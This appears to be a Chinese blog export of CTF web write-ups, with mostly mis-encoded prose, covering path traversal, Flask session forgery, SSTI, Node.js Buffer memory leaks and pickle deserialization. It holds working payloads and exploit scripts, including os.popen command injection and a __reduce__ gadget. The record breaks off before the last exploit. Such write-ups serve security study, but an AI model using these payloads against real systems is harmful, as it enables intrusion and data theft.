    <content><![CDATA[<h4 id="virink-2019-files-share"><a href="#virink-2019-files-share" class="headerlink" title="virink_2019_files_share"></a>virink_2019_files_share</h4><p>æ‰“å¼€é¶æœºï¼Œæ˜¯ä¸€ä¸ªé­”æ–¹æ¸¸æˆï¼Œçœ‹æºç æœ‰hintè¯´flagåœ¨<code> f1ag_Is_h3re</code>ï¼Œä¸€å¼€å§‹å»jsæ–‡ä»¶é‡Œé¢çœ‹äº†ä¸€ä¸‹ï¼Œæ²¡æœ‰å‘ç°å¹³æ—¶æ¸¸æˆé¢˜ç›®ä¸­å¯ä»¥åˆ©ç”¨çš„ç‚¹</p>
<p><img src="https://img-blog.csdnimg.cn/0aa9f312cdf643f58d774a23c746b609.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>å‘ç°æœ‰ä¸€ä¸ª<code>uploads/favicon.ico </code>ï¼Œç›´æ¥è®¿é—®<code>./uploads/</code>ï¼Œå­˜åœ¨ä¸¤ä¸ªæ–‡ä»¶éƒ½åˆ†åˆ«æŠ“ä¸€ä¸‹åŒ…ï¼Œåœ¨previewé‡Œé¢å‘ç°getä¼ çš„å‚ï¼ŒçŒœæµ‹ä¼šä¸ä¼šå­˜åœ¨æ–‡ä»¶åŒ…å«</p>
<p>è¿™é‡ŒServeræ˜¯<code>openresty</code>ï¼Œç™¾åº¦ä¹‹åå‘ç°æ˜¯åŸºäºnginxï¼Œé‚£ä¹ˆç›´æ¥è¯•ç€çœ‹nginxçš„é…ç½®æ–‡ä»¶å•¥çš„</p>
<span id="more"></span>

<p><img src="https://img-blog.csdnimg.cn/de73e1269d4744359168e12261db4aa8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>å°è¯•ä¹‹åå‘ç°æœ‰äº›å­—ç¬¦è¢«banæ‰äº†ï¼Œå¯ä»¥è‡ªå·±è¯•ç€èƒ½ä¸èƒ½é€šè¿‡é‡å¤ç­‰ç»•è¿‡ï¼Œç»•è¿‡è¿‡æ»¤ä¹‹åè¿˜è¦è¿›è¡Œç›®å½•ç©¿è¶Š</p>
<p><img src="https://img-blog.csdnimg.cn/c9a2378f738b4ff8991084c09967d7fb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>é‚£ä¹ˆï¼Œæƒ³è¦å…¶ä»–æ–‡ä»¶å°±ç›´æ¥åœ¨åé¢æ”¹å§ï¼Œæ ¹æ®æç¤ºç›´æ¥å»<code>f1ag_Is_h3re</code>æ‰¾flag</p>
<p>payload1ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?f=....//....//....//....//....//....//f1ag_Is_h3rere</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æ˜¾ç¤ºè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œçœ‹äº†åˆ«çš„å¸ˆå‚…çš„wp</p>
<p>åœ¨åé¢è¿˜è¦åŠ ä¸Šflagï¼ˆä¸ºä»€ä¹ˆå‘¢ï¼Œè™½ç„¶èƒ½ç†è§£f1ag_Is_h3reå¯èƒ½æ˜¯ä¸ªç›®å½•åï¼Œä½†æ˜¯ä¸ºä»€ä¹ˆèƒ½æƒ³åˆ°å‘¢ï¼Œå¯èƒ½è¿˜æ˜¯ä¸€ç§æ€ç»´å§</p>
<p>æœ€ç»ˆpayloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">....//....//....//....//....//....//f1ag_Is_h3rere//flag</span><br></pre></td></tr></table></figure>

<h4 id="PASECA2019-honey-shop"><a href="#PASECA2019-honey-shop" class="headerlink" title="[PASECA2019]honey_shop"></a>[PASECA2019]honey_shop</h4><ul>
<li>ç»å…¸ä¹°ä¸œè¥¿</li>
<li>sessionä¼ªé€ </li>
<li>/proc/self</li>
<li>/environ</li>
</ul>
<p>é¶æœºä¸»é¡µé¢ï¼Œç»å…¸è¦ç”¨é’±ä¹°flagï¼Œåˆšå¥½å·®ä¸€å—é’±ï¼Œå…ˆéƒ½çœ‹çœ‹å§ï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/00bc169409ea4ac0a56d906a37dbd376.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>æŠ“åŒ…ï¼Œå‘ç°åˆæ˜¯sessionä¼ªé€ ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¿®æ”¹balanceä¸º1337ï¼Œè¿™æ ·å°±å¯ä»¥è´­ä¹°flagäº†ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“å¯†é’¥å‘€ï¼ï¼</p>
<p>å†æ¬¡å›åˆ°é¦–é¡µï¼Œåº·åº·æºç ï¼ŒæŠ“æŠ“åŒ…</p>
<p>æœ€åç‚¹å‡»å›¾ç‰‡å¯ä»¥ä¸‹è½½ï¼ŒæŠ“åŒ…åº·åº·ï¼›è¿™ç§æ ·å­ä¸ç¦è®©äººè§‰å¾—æœ‰æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œç”¨<code>/etc/passwd</code>æµ‹è¯•æ˜¯å¦å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´</p>
<p><img src="https://img-blog.csdnimg.cn/fb66bfaf3f5b4dd1aa5ef8c6b73d22ce.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>ç›®å½•ç©¿è¶Šä¹‹åå®ç°äº†æ–‡ä»¶åŒ…å«</p>
<p><img src="https://img-blog.csdnimg.cn/7bec789db81d4ddcb8cc4b7565765c00.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>çœ‹å¸ˆå‚…çš„<a href="https://blog.csdn.net/weixin_44037296/article/details/111469361">wp</a>ï¼Œå­¦åˆ°çš„æ–°çŸ¥è¯†ï¼š</p>
<p>ï¼ˆå› ä¸ºè¿™é‡Œç”¨åˆ°äº†flask sessionä¼ªé€ ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯pythonçš„ç¯å¢ƒ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/proc/self æŒ‡å‘å½“å‰çš„è¿›ç¨‹</span><br><span class="line">/environ å½“å‰è¿›ç¨‹çš„å˜é‡ç¯å¢ƒä¿¡æ¯</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/eceb6ce2b2474078bcac2ad4581fab88.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>å¾—åˆ°å¯†é’¥é‚£å°±ç›´æ¥ä¼ªé€ ï¼Œä¿®æ”¹sessionï¼Œè´­ä¹°flagå§</p>
<p><img src="https://img-blog.csdnimg.cn/d494bbde6fab49a2827d5f31b4a235d7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h4 id="watevrCTF-2019-Supercalc"><a href="#watevrCTF-2019-Supercalc" class="headerlink" title="[watevrCTF-2019]Supercalc"></a>[watevrCTF-2019]Supercalc</h4><ul>
<li>flask sessionä¼ªé€ </li>
<li><code>&#123;&#123;config&#125;&#125;</code></li>
</ul>
<p>æ‰“å¼€é¶æœºï¼Œæ˜¯ä¸€ä¸ªè®¡ç®—å™¨</p>
<p><img src="https://img-blog.csdnimg.cn/7fe2d938ac4740dbbf6b73dffa42b5ea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>æµ‹è¯•å‡ æ¬¡ä¹‹åï¼ŒæŠ“åŒ…å‘ç°sessionï¼Œkaliä¸­è§£å¯†ä¹‹åå¯ä»¥ç¡®å®šæ˜¯flask sessionï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œä¼ªé€ ï¼Œæ—¢ç„¶å·²ç»çŸ¥é“æ˜¯flaskæ¡†æ¶ï¼Œç„¶åæ‰§è¡Œçš„ä»£ç åˆæ˜¯<code>&#123;&#39;1+1&#39;&#125;</code>è¿™æ ·çš„ï¼Œé‚£ä¹ˆå¯ä»¥çŒœæµ‹æ˜¯sstiæ³¨å…¥</p>
<p>ä½†æ˜¯åŒæ ·çš„ï¼Œé‡ç‚¹è¿˜æ˜¯æ‰¾åˆ°å¯†é’¥</p>
<p>è¿™é‡Œåˆ©ç”¨<code>&#123;&#123;config&#125;&#125;</code>ï¼Œä¸è¿‡è¿™é‡Œå¿…é¡»è¦æ˜¯å†å‰é¢çš„è¿ç®—æŠ¥é”™çš„æƒ…å†µä¸‹æ‰èƒ½å®ç°ï¼Œè¿™æˆ–è®¸å’Œåç«¯çš„checkæœ‰å…³ï¼ˆï¼Ÿå¯ä»¥å»çœ‹ä¸€ä¸‹æºç </p>
<p>åˆ©ç”¨æ³¨é‡Šç»•è¿‡åˆ¤æ–­ï¼Œä½†æ˜¯åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­åˆä¼šæ‰§è¡Œï¼Œå¾—åˆ°å¯†é’¥</p>
<p><img src="https://img-blog.csdnimg.cn/fa93f28b618e4da69963ee06220ff5cb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>ä¹‹åç›´æ¥æ‰“payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;history&quot;:[&#123;&quot;code&quot;:&quot;__import__(\&quot;os\&quot;).popen(\&quot;ls\&quot;).read()&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>

<p>å‘ç°æœ‰flag.txt</p>
<p><img src="https://img-blog.csdnimg.cn/dd7c034961e74355863ed4d98a377507.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>ç›´æ¥catå°±å¥½å•¦</p>
<p>payload2ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;history&quot;:[&#123;&quot;code&quot;:&quot;__import__(\&quot;os\&quot;).popen(\&quot;cat flag.txt\&quot;).read()&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>

<h4 id="b01lers2020-Scrambled"><a href="#b01lers2020-Scrambled" class="headerlink" title="[b01lers2020]Scrambled"></a>[b01lers2020]Scrambled</h4><ul>
<li>pythonè„šæœ¬ç¼–å†™</li>
</ul>
<p>ç®€å•æ¥è¯´ï¼Œtransmissionsä¸¤è¾¹çš„<code>kxkxkxkxsh</code>éƒ½ä¸ä¼šæ”¹å˜ï¼Œè€Œä¸­é—´çš„<code>0b29</code>æŒ‡çš„æ˜¯ç¬¬29ä½æ˜¯bï¼Œç¬¬28ä½æ˜¯0ï¼Œç›´æ¥å†™è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://efbfb7c1-8fd8-4ed9-9a4d-0e065c79e0e3.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">res = requests.session()</span><br><span class="line">r = res.get(url, headers=&#123;<span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;frequency=1; transmissions=kxkxkxkxsh0b29kxkxkxkxsh&#x27;</span>&#125;)</span><br><span class="line">flag = [<span class="number">0</span>]*<span class="number">100</span></span><br><span class="line">fflag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>): <span class="comment"># è¿™é‡Œæœ€å¥½æ˜¯è¦100æ­¤ï¼Œéš¾å…ä¼šå‡ºç°é‡å¤çš„transmissionså¯¼è‡´æœ€åçš„ç»“æœé”™è¯¯</span></span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    r = res.get(url)</span><br><span class="line">    cookies = r.cookies</span><br><span class="line">    ans = <span class="built_in">str</span>(cookies[<span class="string">&#x27;transmissions&#x27;</span>])</span><br><span class="line">    ans = ans.replace(<span class="string">&#x27;kxkxkxkxsh&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;%7B&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>).replace(<span class="string">&#x27;%7D&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line">    index = ans[<span class="number">2</span>:]</span><br><span class="line">    flag[<span class="built_in">int</span>(index)] = ans[<span class="number">1</span>]</span><br><span class="line">    flag[<span class="built_in">int</span>(index)-<span class="number">1</span>] = ans[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-------loading-------&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    fflag += <span class="built_in">str</span>(flag[i])</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(fflag)</span><br></pre></td></tr></table></figure>

<h4 id="æœ€åï¼š"><a href="#æœ€åï¼š" class="headerlink" title="æœ€åï¼š"></a>æœ€åï¼š</h4><p>å­¦åˆ°çš„æ–°çŸ¥è¯†ç‚¹ï¼š</p>
<p><strong>0x01:</strong></p>
<p><code>/proc/self</code> æŒ‡å‘å½“å‰è¿›ç¨‹</p>
<p><code>/environ</code> æŒ‡å‘è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ä¿¡æ¯</p>
<p>åšäº†å¥½å¤šflask sessionä¼ªé€ </p>
<p><strong>0x02:</strong></p>
<p>åˆ©ç”¨<code>&#123;&#123;config&#125;&#125;</code>è·å–ç¯å¢ƒå˜é‡</p>
<p>flaskæ¡†æ¶sstiæ³¨å…¥</p>
<p><strong>â€”â€”â€”â€”â€”â€”â€”â€“TBCâ€”â€”â€”â€”â€”â€”â€”â€”â€”</strong></p>
]]></content>
      <categories>
        <category>é›†è®­</category>
      </categories>
      <tags>
        <tag>buuåˆ·é¢˜</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>é›†è®­ç¬¬ä¸‰å‘¨å­¦ä¹ </title>
    <url>/2022/02/12/%E9%9B%86%E8%AE%AD%E7%AC%AC%E4%B8%89%E5%91%A8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h4 id="HITCON-2016-Leaking"><a href="#HITCON-2016-Leaking" class="headerlink" title="[HITCON 2016]Leaking"></a>[HITCON 2016]Leaking</h4><ul>
<li>nodejs</li>
</ul>
<p>åœ¨è¾ƒæ—©ä¸€ç‚¹çš„ node ç‰ˆæœ¬ä¸­ (8.0 ä¹‹å‰)ï¼Œå½“ Buffer çš„æ„é€ å‡½æ•°ä¼ å…¥æ•°å­—æ—¶, ä¼šå¾—åˆ°ä¸æ•°å­—é•¿åº¦ä¸€è‡´çš„ä¸€ä¸ª Bufferï¼Œå¹¶ä¸”è¿™ä¸ª Buffer æ˜¯æœªæ¸…é›¶çš„ã€‚8.0 ä¹‹åçš„ç‰ˆæœ¬å¯ä»¥é€šè¿‡å¦ä¸€ä¸ªå‡½æ•° Buffer.allocUnsafe(size) æ¥è·å¾—æœªæ¸…ç©ºçš„å†…å­˜ã€‚</p>
<p>ä¹Ÿå°±æ˜¯å¯ä»¥åˆ©ç”¨Buffer()æ¥è¯»å–å†…å­˜</p>
<hr>
<span id="more"></span>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> randomstring = <span class="built_in">require</span>(<span class="string">&quot;randomstring&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> &#123;</span><br><span class="line">    VM</span><br><span class="line">&#125; = <span class="built_in">require</span>(<span class="string">&quot;vm2&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> flag = <span class="built_in">require</span>(<span class="string">&quot;./config.js&quot;</span>).flag</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.header(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/plain&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */</span></span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">&quot;var flag_&quot;</span> + randomstring.generate(<span class="number">64</span>) + <span class="string">&quot; = \&quot;hitcon&#123;&quot;</span> + flag + <span class="string">&quot;&#125;\&quot;;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (req.query.data &amp;&amp; req.query.data.length &lt;= <span class="number">12</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> vm = <span class="keyword">new</span> VM(&#123;</span><br><span class="line">            <span class="attr">timeout</span>: <span class="number">1000</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="built_in">console</span>.log(req.query.data);</span><br><span class="line">        res.send(<span class="string">&quot;eval -&gt;&quot;</span> + vm.run(req.query.data));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(fs.readFileSync(__filename).toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;listening on port 3000!&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>å®¡è®¡æºç å¯ä»¥çŸ¥é“å®šä¹‰å’Œflagï¼Œä½†æ˜¯flagå˜é‡åå­—æœªçŸ¥ï¼Œä½†æ˜¯<code>res.send(&quot;eval -&gt;&quot; + vm.run(req.query.data));</code>ä½¿å¾—æˆ‘ä»¬å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç </p>
<p>ä¸è¿‡ç”±äºæ²¡æ€ä¹ˆåšè¿‡nodejsç±»å‹çš„é¢˜ç›®ï¼Œæ‰€ä»¥çœ‹äº†åˆ«çš„å¸ˆå‚…çš„wp</p>
<p>å¯ä»¥çŸ¥é“è¿™é‡Œåˆ©ç”¨nodejsæ²™ç®±é€ƒé€¸è¿›è¡Œä»»æ„ä»£ç æ‰§è¡Œ</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://32ae46a5-a44c-452f-bf07-0b157261450b.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;?data=Buffer(500)&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url+payload)</span><br><span class="line"><span class="keyword">while</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">    r = requests.get(url + payload)</span><br><span class="line">    <span class="built_in">print</span>(r.status_code)</span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&#123;&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<h4 id="HFCTF-2021-Final-easyflask"><a href="#HFCTF-2021-Final-easyflask" class="headerlink" title="[HFCTF 2021 Final]easyflask"></a>[HFCTF 2021 Final]easyflask</h4><ul>
<li>sessionä¼ªé€ </li>
<li>pythonåºåˆ—åŒ– <code>__reduce__</code></li>
</ul>
<p><code>Pickle</code>çš„<code>dumps</code>å’Œ<code>loads</code>:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> _pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>:</span></span><br><span class="line">    name: <span class="string">&quot;admin&quot;</span></span><br><span class="line">    is_admin: <span class="number">0</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(_pickle.dumps(User()))</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(_pickle.dumps(User())))</span><br><span class="line">usr = _pickle.dumps(User())</span><br><span class="line"><span class="built_in">print</span>(_pickle.loads(usr))</span><br></pre></td></tr></table></figure>

<p><code>__reduce__</code>:</p>
<p>ç±»ä¼¼äºphpçš„<code>__wakeup()</code>ï¼Œåœ¨ååºåˆ—åŒ–ä¹‹å‰è‡ªåŠ¨è°ƒç”¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> _pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>:</span></span><br><span class="line">    name: <span class="string">&quot;admin&quot;</span></span><br><span class="line">    is_admin: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ä½ è¿›è¡Œäº†ååºåˆ—åŒ–&quot;</span>)</span><br><span class="line">        os.system(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(_pickle.dumps(User()))</span><br><span class="line">    <span class="built_in">print</span>(base64.b64encode(_pickle.dumps(User())))</span><br><span class="line">    usr = _pickle.dumps(User())</span><br><span class="line">    <span class="built_in">print</span>(_pickle.loads(usr))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>) </span><br></pre></td></tr></table></figure>

<hr>
<p>è·å–åˆ°æºç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;*******&quot;</span></span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;u&#x27;</span>):</span><br><span class="line">        u = pickle.dumps(User())</span><br><span class="line">        session[<span class="string">&#x27;u&#x27;</span>] = u</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/file?file=index.js&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_handler</span>():</span></span><br><span class="line">    path = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    path = os.path.join(<span class="string">&#x27;static&#x27;</span>, path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path) <span class="keyword">or</span> os.path.isdir(path) \</span><br><span class="line">            <span class="keyword">or</span> <span class="string">&#x27;.py&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;.sh&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;disallowed&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        content = fp.read()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_handler</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        u = session.get(<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(u, <span class="built_in">dict</span>):</span><br><span class="line">            u = b64decode(u.get(<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line">        u = pickle.loads(u)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;uhh?&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> u.is_admin == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;welcome, admin&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;who are you?&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.ç†Ÿæ‚‰çš„<code>secret_key</code> åŠ ä¸Šflaskæ¡†æ¶ç›´æ¥ç”¨ä»¥å‰çš„è„šæœ¬è¿›è¡Œsessionä¼ªé€ å°±å¥½äº†</p>
<p>2.å®šä¹‰äº†ä¸€ä¸ª<code>User</code>ç±»ï¼Œå¯çŸ¥æˆ‘ä»¬è¦ä¼ªé€ çš„å†…å®¹ä¸º<code>uname:admin is_admin:1</code></p>
<p>3.åˆ©ç”¨pythonçš„pickleçš„dumpså’Œloadsè¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–</p>
<p>æ‰€ä»¥å¯ä»¥åˆ©ç”¨<code>__reduce__</code>æ–¹æ³•è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p>
<p>expï¼šï¼ˆæœ€å¥½åœ¨linux python2ç¯å¢ƒ</p>
